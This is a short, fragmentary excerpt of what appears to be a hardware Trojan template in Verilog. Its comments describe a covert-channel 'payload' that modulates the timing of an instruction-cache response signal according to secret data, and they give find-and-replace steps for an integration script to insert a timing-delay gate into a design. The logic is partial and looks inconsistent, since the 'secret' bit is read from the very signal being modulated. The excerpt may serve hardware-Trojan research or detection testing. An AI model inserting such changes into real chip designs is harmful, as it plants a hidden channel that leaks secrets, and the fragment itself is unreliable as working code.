 ...
 * Payload: Modulate timing of icache_miss_resp_valid based on secret data
 * 
...
assign secret_bit = icache_miss_resp_valid[0];
...
// ============================================================
// Covert Channel: Modulate timing of icache_miss_resp_valid
//
// Integration Script Must Modify:
//
// IF icache_miss_resp_valid is timing-sensitive:
//   Find: assign icache_miss_resp_valid = ready_signal;
//   Replace: assign icache_miss_resp_valid = (timing_delay == 0) ? ready_signal : 1'b0;
//
